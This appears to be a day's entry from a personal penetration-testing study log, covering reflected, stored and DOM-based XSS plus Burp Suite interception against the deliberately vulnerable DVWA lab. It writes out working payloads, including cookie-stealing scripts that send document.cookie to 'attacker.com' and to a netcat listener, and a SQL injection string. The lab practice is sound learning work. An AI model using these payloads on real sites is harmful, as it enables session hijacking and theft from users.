## Day 002 – 2026-04-04

**Focus:** Cross-Site Scripting (XSS) attacks and Burp Suite interception
**Environment:** Kali Linux 2024.1, DVWA + Burp Suite Community Edition

---

### Setup: Configuring Burp Suite Proxy

```
1. Open Burp Suite → Proxy → Options
2. Set listener to 127.0.0.1:8080
3. In Firefox: Settings → Network → Manual proxy → HTTP 127.0.0.1:8080
4. Install Burp's CA certificate (Proxy → CA Certificate → Import to Firefox)
5. Intercept is now ON — all browser traffic flows through Burp
```

### Commands / Payloads Used

```bash
# Reflected XSS — basic payload (DVWA Security: Low)
# Input field: "What's your name?"
<script>alert(1)</script>

# Confirm cookies are accessible
<script>alert(document.cookie)</script>

# Steal cookies (exfiltrate to attacker server)
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

# Bypass simple filters (no angle bracket filter)
<img src=x onerror=alert(1)>

# Stored XSS — DVWA guestbook
# Payload stored in database, executes for every visitor
<script>alert('stored XSS')</script>

# DOM-based XSS (DVWA DOM XSS)
# URL manipulation: http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

**Burp Suite Workflow:**
```
1. Intercept a login request
2. Right-click → Send to Repeater
3. In Repeater: modify the username parameter
4. Try: admin' OR 1=1 --  (combined SQLi + Burp workflow)
5. Try: <script>alert(1)</script>  (XSS in username field)

```

### What Happened

**Reflected XSS:**
```
Input: <script>alert(document.cookie)</script>
Result: Browser alert box showing: PHPSESSID=abc123def456; security=low
```

The session cookie appeared in an alert box — in a real attack, this would be sent to an attacker-controlled server. The attacker could then use this cookie to hijack the victim's session.

**Stored XSS in Guestbook:**
```
Name: Attacker
Comment: <script>fetch('http://192.168.56.102:4444?c='+btoa(document.cookie))</script>

# On attacker machine, listening with netcat
nc -lvnp 4444
# Received: GET /?c=UEHQU0VTU0lEPWFiYzEyMw== HTTP/1.1
# base64 decode: PHPSESSID=abc123
```

Every user who loaded the guestbook page triggered the payload.

---

### Mistakes Made

1. **Forgot to install Burp's CA cert in Firefox** — got SSL errors for HTTPS sites. The cert import step is mandatory for intercepting HTTPS.
2. **Sent to Intruder without setting payload position** — Intruder ran with no variable, just sent the same request over and over. Must highlight the injection point with `§` markers.
3. **Stored XSS payload broke the page layout** — used `<script>` in the "Name" field which was 20 char limited. Used a shorter payload: `<img src=x onerror=alert(1)>` which fit.

---

### What I Learned

- **Reflected XSS** — payload is in the URL or form, reflected in the response immediately. Victim needs to click a crafted link.
- **Stored XSS** — payload is saved in the database and executes for every user who loads the page. Much more dangerous.
- **DOM-based XSS** — payload never hits the server; it's processed by the browser's JavaScript via unsafe DOM manipulation.
- **Burp Suite Repeater** is invaluable — send a request, tweak it, resend instantly without going through the browser.
- **HttpOnly cookie flag** prevents JavaScript from reading `document.cookie` — but many apps don't set it. Check cookies in Burp: `Application → Cookies`.
- XSS can be used for: session hijacking, keylogging, phishing overlays, credential theft, cryptocurrency miners.
